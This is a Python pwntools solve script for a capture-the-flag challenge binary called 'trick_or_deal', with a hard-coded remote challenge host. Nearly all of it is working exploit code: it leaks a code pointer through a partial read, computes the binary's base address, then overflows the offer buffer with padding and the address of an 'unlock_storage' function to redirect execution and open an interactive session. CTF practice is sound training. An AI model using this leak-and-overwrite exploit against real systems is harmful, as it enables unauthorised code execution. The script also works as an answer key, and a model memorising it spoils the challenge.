import argparse
from pwn import *
from ctfkit import get_process, OffsetCalculator

#context.arch = '[BINARY_ARCH_PLACEHOLDER]'
context.binary = './trick_or_deal'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = "94.237.63.93:58"
GDB_SCRIPT = ""

def main(args):
  proc = get_process(args)

  proc.sendlineafter(b'What do you want to do? ', b'3')
  proc.sendlineafter(b'(y/n): ', b'y')
  proc.sendlineafter(b'How long do you want your offer to be? ', b'8')
  proc.sendlineafter(b'What can you offer me? ', b'nothin')
  
  # There is a chance that we get hit with a 00, i believe there is a 1/16th chance
  proc.sendlineafter(b'What do you want to do? ', b'2')
  proc.sendlineafter(b'What do you want!!? ', b'A'*7) # we want to write 8 bytes, 7 A's + \n
  proc.recvuntil(b'A'*7 + b'\n')
  leak = proc.recvline().strip()
  if len(leak) < 4:
    print("Bad leak, null byte encountered")
    exit()

  leak = int.from_bytes(leak, "little")

  elf_base = OffsetCalculator(0x100000, 0x1015e2, leak)
  unlock_storage = elf_base.get(0x100eff) # unlock_storage

  proc.sendlineafter(b'What do you want to do? ', b'4')

  proc.sendlineafter(b'What do you want to do? ', b'3')
  proc.sendlineafter(b'(y/n): ', b'y')
  proc.sendlineafter(b'How long do you want your offer to be? ', str(0x50).encode())
  payload = b''.join([
    b'A'*0x48,
    p64(unlock_storage)
  ])

  # need to use sendafter because sendlineafter includes a \n, which read won't read until it starts to read from the menu, which \n is not a valid option
  proc.sendafter(b'What can you offer me? ', payload) 
  proc.sendlineafter(b'What do you want to do? ', b'1')
  
  proc.interactive()


# argparse is primarily used to just clean up how we handle process creation
if __name__ == '__main__':
  parser = argparse.ArgumentParser(description="Solve script")
  parser.add_argument("-r","--remote", nargs='?', const=True, default=False)
  parser.add_argument("-d","--debug", action='store_true')
  parser.add_argument("-x","--no-aslr", action='store_true')

  args = parser.parse_args()

  # Check that remote and debug is not both set
  if args.remote and args.debug:
    print("Can't debug remote process, need a gdbserver")
    exit(-1)

  # Check for remote argument and grab argument if it is passed one
  if args.remote is not False:
    if args.remote is not True:
      HOST = args.remote

    # Check that host looks valid
    if len(HOST.split(":")) != 2:
      print("Please specify HOST if using remote")
      exit(-1)

    args.host = HOST

  args.gdb_script = GDB_SCRIPT

  main(args)

